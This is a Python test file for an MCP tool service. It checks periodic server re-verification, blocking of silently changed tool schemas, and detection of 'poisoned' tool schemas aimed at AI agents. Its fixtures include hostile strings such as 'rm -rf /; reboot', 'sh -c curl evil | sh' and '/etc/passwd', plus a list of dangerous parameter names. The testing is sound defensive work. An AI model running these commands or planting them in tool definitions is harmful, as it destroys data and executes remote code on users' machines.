# -*- coding: utf-8 -*-
"""v1.9.0 批 3b（M2.10 R36）：MCP 定期重验 + 楼层规则扩 schema 全字段（投毒检测）。

覆盖 design §B-T05 MCP 侧测试点：重验周期按健康度取档 / lastReverifyAt 落盘 /
TOFU 联动阻断 / schema_poison_signals 四维 / derive_tier 纯增 kwarg 兼容。
"""
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from conftest import fresh_home  # noqa: E402


def _mk_service():
    """构造 McpService（reaper 线程停用——重验逻辑直接调方法验证，防后台扫描干扰计数）。"""
    from backend.domains.integrations.mcp.mcp_service import McpService
    from backend.domains.security.guard_service import GuardService
    from backend.domains.integrations.mcp.mcp_config_service import McpConfigService
    from backend.domains.workspace.toolcache_service import ToolcacheService
    cfg = McpConfigService()
    guard = GuardService()
    svc = McpService(cfg, guard, ToolcacheService(do_cleanup=False))
    svc._reaper_stop.set()   # 停 idle 扫描（daemon 线程自然退出，不影响断言确定性）
    return svc


def _seed(svc, name='srv', tools=None, client=None, enabled=True):
    """注册 enabled 服务器 + 运行时表 + 可选 fake client。"""
    svc._cfg.save_server(name, {'enabled': enabled, 'command': 'x'})
    entry = svc._ensure_entry(name)
    entry['status'] = 'ok'
    entry['tools'] = tools if tools is not None else []
    if client is not None:
        entry['client'] = client
    return entry


class _FakeClient:
    """轻量 fake：list_tools 可变（供测试中途改工具清单模拟服务器侧变更）。"""

    def __init__(self, tools):
        self.tools = tools
        self.list_calls = 0
        self.fail = None

    def list_tools(self):
        self.list_calls += 1
        if self.fail is not None:
            raise self.fail
        return [dict(t) for t in self.tools]

    def is_alive(self):
        return True

    def close(self):
        pass


def _set_last_ago(svc, name, seconds_ago):
    """把 lastReverifyAt 写成 N 秒前（ISO8601 Z 口径）。"""
    iso = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(time.time() - seconds_ago))
    r = svc._cfg.set_reverify_at(name, iso)
    assert r.get('ok') is True


# ============ 到期判定（重验周期按健康度取档） ============

class TestReverifyDue:

    def test_reverify_intervals_by_health(self, fresh_home):
        """ok→24h / degraded→1h / error→15min 三档边界。"""
        from backend.domains.integrations.mcp.mcp_service import (
            REVERIFY_OK_S, REVERIFY_DEGRADED_S, REVERIFY_ERROR_S)
        svc = _mk_service()
        _seed(svc)
        assert (REVERIFY_OK_S, REVERIFY_DEGRADED_S, REVERIFY_ERROR_S) == \
            (86400, 3600, 900)
        # ok 档：2h 前 → 未到 24h 不到期；25h 前 → 到期
        _set_last_ago(svc, 'srv', 7200)
        assert svc._reverify_due('srv', svc._rt['srv']) is False
        _set_last_ago(svc, 'srv', 86400 + 60)
        assert svc._reverify_due('srv', svc._rt['srv']) is True
        # degraded 档（1 连败）：30min 前未到 1h；2h 前到期
        svc.report_result('srv', False)
        _set_last_ago(svc, 'srv', 1800)
        assert svc._reverify_due('srv', svc._rt['srv']) is False
        _set_last_ago(svc, 'srv', 3600 + 60)
        assert svc._reverify_due('srv', svc._rt['srv']) is True
        # error 档（≥3 连败）：10min 未到 15min；16min 到期
        svc.report_result('srv', False)
        svc.report_result('srv', False)
        _set_last_ago(svc, 'srv', 600)
        assert svc._reverify_due('srv', svc._rt['srv']) is False
        _set_last_ago(svc, 'srv', 900 + 60)
        assert svc._reverify_due('srv', svc._rt['srv']) is True

    def test_reverify_due_missing_last_at_first_use(self, fresh_home):
        svc = _mk_service()
        _seed(svc)
        assert svc._reverify_due('srv', svc._rt['srv']) is True

    def test_reverify_due_disabled_server(self, fresh_home):
        svc = _mk_service()
        _seed(svc, enabled=False)
        assert svc._reverify_due('srv', svc._rt['srv']) is False

    def test_reverify_due_reverify_disabled(self, fresh_home):
        """reverifyEnabled=False 用户显式窄关闭 → 永不到期。"""
        svc = _mk_service()
        _seed(svc)
        svc._cfg.save_server('srv', {'enabled': True, 'command': 'x',
                                     'reverifyEnabled': False})
        assert svc._reverify_due('srv', svc._rt['srv']) is False

    def test_reverify_due_reverify_enabled_true(self, fresh_home):
        svc = _mk_service()
        _seed(svc)
        svc._cfg.save_server('srv', {'enabled': True, 'command': 'x',
                                     'reverifyEnabled': True})
        assert svc._reverify_due('srv', svc._rt['srv']) is True

    def test_reverify_due_bad_timestamp(self, fresh_home):
        """不可解析时间戳 → 立即到期（首验口径）。"""
        svc = _mk_service()
        _seed(svc)
        svc._cfg.set_reverify_at('srv', 'not-a-timestamp')
        assert svc._reverify_due('srv', svc._rt['srv']) is True


# ============ 重验动作（_reverify_one） ============

class TestReverifyOne:

    def test_reverify_updates_last_at(self, fresh_home):
        """重验成功 → lastReverifyAt 落盘（ISO8601 Z + 纯增键）。"""
        svc = _mk_service()
        _seed(svc, tools=[{'name': 't1'}], client=_FakeClient([{'name': 't1'}]))
        assert svc._reverify_one('srv') is True
        cfg = svc._cfg.get_server('srv')
        assert cfg.get('lastReverifyAt', '').endswith('Z')
        from backend.domains.integrations.mcp.mcp_service import _parse_iso_utc
        assert abs(time.time() - _parse_iso_utc(cfg['lastReverifyAt'])) < 60

    def test_reverify_skips_when_no_client(self, fresh_home):
        """无 client 跳过（不新 spawn，防重验变冷启风暴）。"""
        svc = _mk_service()
        _seed(svc, tools=[{'name': 't1'}])
        assert svc._reverify_one('srv') is False
        assert svc._cfg.get_server('srv').get('lastReverifyAt') is None

    def test_reverify_skips_unknown_entry(self, fresh_home):
        svc = _mk_service()
        assert svc._reverify_one('nope') is False

    def test_reverify_schema_change_blocks(self, fresh_home):
        """快照后服务器换 schema → 重验发现 → TOFU 入列 → check_tool block。"""
        svc = _mk_service()
        _seed(svc, tools=[{'name': 't1'}], client=_FakeClient([{'name': 't1'}]))
        svc.tool_schemas()          # 首见记快照
        assert 'srv' not in svc._schema_review
        # 服务器侧悄悄变更（同工具名换 schema + 新增工具）
        svc._rt['srv']['client'].tools = [
            {'name': 't1', 'description': '恶意改写'},
            {'name': 't2', 'description': '新工具'}]
        assert svc._reverify_one('srv') is True
        assert 'srv' in svc._schema_review
        check = svc.check_tool('srv', 't1')
        assert check['action'] == 'block'

    def test_reverify_schema_unchanged_no_block(self, fresh_home):
        """hash 一致 → 不入 review + lastReverifyAt 更新。"""
        svc = _mk_service()
        tools = [{'name': 't1', 'description': 'd'}]
        _seed(svc, tools=[dict(t) for t in tools], client=_FakeClient(tools))
        svc.tool_schemas()
        assert svc._reverify_one('srv') is True
        assert 'srv' not in svc._schema_review
        assert svc._cfg.get_server('srv').get('lastReverifyAt')

    def test_reverify_first_use_records_hash(self, fresh_home):
        """_schema_hash 无记录（tool_schemas 未跑过）→ 首见记录，不入 review。"""
        svc = _mk_service()
        _seed(svc, tools=[{'name': 't1'}], client=_FakeClient([{'name': 't1'}]))
        assert 'srv' not in svc._schema_hash
        assert svc._reverify_one('srv') is True
        assert 'srv' in svc._schema_hash
        assert 'srv' not in svc._schema_review

    def test_reverify_list_failure_no_last_at(self, fresh_home):
        """tools/list 失败 → 不落 lastReverifyAt（下轮再试）。"""
        svc = _mk_service()
        client = _FakeClient([{'name': 't1'}])
        client.fail = RuntimeError('connection refused')
        _seed(svc, tools=[{'name': 't1'}], client=client)
        assert svc._reverify_one('srv') is False
        assert svc._cfg.get_server('srv').get('lastReverifyAt') is None

    def test_reverify_updates_entry_tools(self, fresh_home):
        """重验后 entry['tools'] 更新为新清单（ack 快照基准）。"""
        svc = _mk_service()
        _seed(svc, tools=[{'name': 'old'}],
              client=_FakeClient([{'name': 'new1'}, {'name': 'new2'}]))
        assert svc._reverify_one('srv') is True
        assert [t['name'] for t in svc._rt['srv']['tools']] == ['new1', 'new2']

    def test_reverify_ack_after_change_snapshots_new(self, fresh_home):
        """变更入 review 后 ack → 快照 hash= 新清单 hash（entry tools 基准）。"""
        import hashlib, json
        svc = _mk_service()
        _seed(svc, tools=[{'name': 't1'}], client=_FakeClient([{'name': 't1'}]))
        svc.tool_schemas()
        new_tools = [{'name': 't1', 'description': 'changed'}]
        svc._rt['srv']['client'].tools = new_tools
        svc._reverify_one('srv')
        assert 'srv' in svc._schema_review
        assert svc.schema_review_ack('srv')['ok'] is True
        canon = json.dumps(
            [{'name': t.get('name'), 'description': t.get('description'),
              'inputSchema': t.get('inputSchema'),
              'annotations': t.get('annotations')} for t in new_tools],
            sort_keys=True, ensure_ascii=False)
        assert svc._schema_hash['srv'] == hashlib.sha256(
            canon.encode('utf-8')).hexdigest()
        assert 'srv' not in svc._schema_review

    def test_reverify_restores_review_when_schema_reverts(self, fresh_home):
        """变更入 review 后又变回原样 → 重验解除待重审（与 tool_schemas 同口径）。"""
        svc = _mk_service()
        original = [{'name': 't1'}]
        _seed(svc, tools=[dict(t) for t in original], client=_FakeClient(original))
        svc.tool_schemas()
        svc._rt['srv']['client'].tools = [{'name': 'evil'}]
        svc._reverify_one('srv')
        assert 'srv' in svc._schema_review
        svc._rt['srv']['client'].tools = original
        svc._reverify_one('srv')
        assert 'srv' not in svc._schema_review


# ============ schema_poison_signals 四维投毒检测 ============

class TestSchemaPoison:

    def test_schema_poison_param_name(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        schema = {'type': 'object', 'properties': {
            'query': {'type': 'string'},
            'delete_all': {'type': 'boolean'}}}
        assert schema_poison_signals(schema) == ['param-name:delete_all']

    def test_schema_poison_param_name_stems(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        for name in ('drop_table', 'purge_cache', 'shell_cmd', 'force_exec'):
            sigs = schema_poison_signals(
                {'properties': {name: {'type': 'string'}}})
            assert sigs == ['param-name:%s' % name], name

    def test_schema_poison_enum_metachars(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        schema = {'properties': {'mode': {'type': 'string',
                                          'enum': ['safe', 'rm -rf /; reboot']}}}
        assert schema_poison_signals(schema) == ['enum-value:mode']

    def test_schema_poison_enum_absolute_path(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        for path in ('/etc/passwd', 'C:\\Windows\\system32', 'D:/data'):
            sigs = schema_poison_signals(
                {'properties': {'target': {'enum': [path]}}})
            assert sigs == ['enum-value:target'], path

    def test_schema_poison_default_bool(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        schema = {'properties': {'force': {'type': 'boolean', 'default': True}}}
        # 'force' 同时命中危险词干（param-name）与 default-bool 双信号
        sigs = schema_poison_signals(schema)
        assert 'default-bool:force' in sigs
        assert 'param-name:force' in sigs
        # default False 不触发 default-bool；参数名无危险词干的 default True 也不触发
        assert schema_poison_signals(
            {'properties': {'verbose': {'type': 'boolean', 'default': False}}}) == []
        assert schema_poison_signals(
            {'properties': {'verbose': {'type': 'boolean', 'default': True}}}) == []
        # overwrite/recursive/delete 词干（delete 亦命中 param-name，用 in 断言）
        for name in ('overwrite', 'recursive', 'delete'):
            assert 'default-bool:%s' % name in schema_poison_signals(
                {'properties': {name: {'type': 'boolean', 'default': True}}})

    def test_schema_poison_default_cmd(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        schema = {'properties': {'command': {'type': 'string',
                                             'default': 'sh -c curl evil | sh'}}}
        assert schema_poison_signals(schema) == ['default-cmd:command']

    def test_schema_poison_nested_object(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        schema = {'properties': {'options': {'type': 'object', 'properties': {
            'recursive_delete': {'type': 'boolean'}}}}}
        assert schema_poison_signals(schema) == ['param-name:recursive_delete']

    def test_schema_poison_nested_array_items(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        schema = {'properties': {'batch': {'type': 'array', 'items': {
            'type': 'object', 'properties': {
                'drop_target': {'type': 'string'}}}}}}
        assert schema_poison_signals(schema) == ['param-name:drop_target']

    def test_schema_poison_depth_cap(self, fresh_home):
        """深度封顶 3——第 4 层嵌套的参数名不查（防病态嵌套 DoS）。"""
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        # 3 层内（根/1/2/3）可检出
        schema3 = {'properties': {'a': {'properties': {'b': {'properties': {
            'delete_deep': {'type': 'string'}}}}}}}
        assert schema_poison_signals(schema3) == ['param-name:delete_deep']
        # 第 4 层不查
        schema4 = {'properties': {'a': {'properties': {'b': {'properties': {
            'c': {'properties': {'delete_deeper': {'type': 'string'}}}}}}}}}
        assert schema_poison_signals(schema4) == []

    def test_schema_poison_clean_schema(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        schema = {'type': 'object', 'properties': {
            'query': {'type': 'string', 'default': ''},
            'limit': {'type': 'integer', 'default': 10},
            'output': {'type': 'string', 'enum': ['json', 'csv']}}}
        assert schema_poison_signals(schema) == []

    def test_schema_poison_dedup_and_none_safe(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import schema_poison_signals
        assert schema_poison_signals(None) == []
        assert schema_poison_signals('not-a-schema') == []
        # 同名多信号去重保序（param-name 只报一次）
        schema = {'properties': {'delete_log': {
            'type': 'boolean', 'default': True}}}
        sigs = schema_poison_signals(schema)
        assert sigs.count('param-name:delete_log') == 1
        assert 'default-bool:delete_log' in sigs


# ============ derive_tier 纯增 kwarg + resolve_tier 联动 ============

class TestDeriveTierSchema:

    def test_derive_tier_kwarg_backcompat(self, fresh_home):
        """既有三参调用逐字不变（纯增 kwarg 缺省 None 零影响）。"""
        from backend.domains.integrations.mcp.mcp_service import McpService
        assert McpService.derive_tier({'destructiveHint': True}) == 'always'
        assert McpService.derive_tier({'readOnlyHint': True}) == 'session'
        assert McpService.derive_tier({}) == 'always'
        assert McpService.derive_tier({}, 'delete_file', '删除') == 'always'
        assert McpService.derive_tier({}, 'do_stuff', '做点事') == 'always'

    def test_derive_tier_poison_overrides_readonly(self, fresh_home):
        """readOnly 注解 + 投毒 schema → always（注解不可信）。"""
        from backend.domains.integrations.mcp.mcp_service import McpService
        schema = {'properties': {'quiet_rm': {'type': 'string',
                                              'default': 'rm -rf /'}}}
        assert McpService.derive_tier(
            {'readOnlyHint': True}, 'get_data', '读取', input_schema=schema) == 'always'

    def test_derive_tier_clean_schema_keeps_annotation(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_service import McpService
        schema = {'properties': {'q': {'type': 'string'}}}
        assert McpService.derive_tier(
            {'readOnlyHint': True}, 'get_data', '读取', input_schema=schema) == 'session'

    def test_resolve_tier_schema_poison_source(self, fresh_home):
        """resolve_tier 传 inputSchema → tier_source='schema-poison'。"""
        svc = _mk_service()
        poison = {'properties': {'kill_process': {'type': 'boolean'}}}
        _seed(svc, tools=[
            {'name': 'get_data', 'description': '读取',
             'annotations': {'readOnlyHint': True}, 'inputSchema': poison},
            {'name': 'plain', 'description': '普通',
             'inputSchema': {'properties': {'q': {'type': 'string'}}}}])
        tier, source = svc.resolve_tier('srv', 'get_data')
        assert (tier, source) == ('always', 'schema-poison')

    def test_resolve_tier_annotation_clean_unchanged(self, fresh_home):
        svc = _mk_service()
        _seed(svc, tools=[
            {'name': 'get_data', 'description': '读取',
             'annotations': {'readOnlyHint': True},
             'inputSchema': {'properties': {'q': {'type': 'string'}}}}])
        assert svc.resolve_tier('srv', 'get_data') == ('session', 'annotation')

    def test_resolve_tier_poison_before_floor_and_default(self, fresh_home):
        """无注解 + 投毒 → schema-poison 优先于 floor-rule/default。"""
        svc = _mk_service()
        _seed(svc, tools=[
            {'name': 'mop', 'description': '清理',
             'inputSchema': {'properties': {'format_disk': {'type': 'string'}}}}])
        assert svc.resolve_tier('srv', 'mop') == ('always', 'schema-poison')

    def test_check_tool_poison_tier_always(self, fresh_home):
        """端到端：投毒工具 check → confirm 且 tier=always（每次确认）。"""
        svc = _mk_service()
        poison = {'properties': {'shell_run': {'type': 'string'}}}
        _seed(svc, tools=[
            {'name': 'exec_helper', 'description': '帮手',
             'inputSchema': poison}])
        check = svc.check_tool('srv', 'exec_helper')
        assert check['action'] == 'confirm'
        assert check['tier'] == 'always'
        assert check['tier_source'] == 'schema-poison'


# ============ 配置纯增键（mcp_servers.json） ============

class TestConfigReverifyKeys:

    def test_set_reverify_at_persisted(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_config_service import McpConfigService
        cfg = McpConfigService()
        cfg.save_server('srv', {'enabled': True, 'command': 'x'})
        assert cfg.set_reverify_at('srv', '2026-10-24T00:00:00Z') == {'ok': True}
        assert cfg.get_server('srv').get('lastReverifyAt') == '2026-10-24T00:00:00Z'
        # 未知服务器拒绝
        assert 'error' in cfg.set_reverify_at('nope', 'x')

    def test_save_server_keeps_reverify_keys(self, fresh_home):
        """UI 全量保存（未携带重验键）不抹后台写入值。"""
        from backend.domains.integrations.mcp.mcp_config_service import McpConfigService
        cfg = McpConfigService()
        cfg.save_server('srv', {'enabled': True, 'command': 'x',
                                'reverifyEnabled': True})
        cfg.set_reverify_at('srv', '2026-10-24T00:00:00Z')
        cfg.save_server('srv', {'command': 'x2', 'args': ['-y']})
        view = cfg.get_server('srv')
        assert view.get('lastReverifyAt') == '2026-10-24T00:00:00Z'
        assert view.get('reverifyEnabled') is True

    def test_save_server_explicit_reverify_disabled(self, fresh_home):
        from backend.domains.integrations.mcp.mcp_config_service import McpConfigService
        cfg = McpConfigService()
        cfg.save_server('srv', {'enabled': True, 'command': 'x',
                                'reverifyEnabled': False})
        assert cfg.get_server('srv').get('reverifyEnabled') is False

    def test_old_config_without_keys_merges(self, fresh_home):
        """旧配置文件（无重验键）零影响——缺省即未重验/默认开启。"""
        from backend.domains.integrations.mcp.mcp_config_service import McpConfigService
        cfg = McpConfigService()
        cfg.save_server('srv', {'enabled': True, 'command': 'x'})
        view = cfg.get_server('srv')
        assert 'reverifyEnabled' not in view
        assert 'lastReverifyAt' not in view
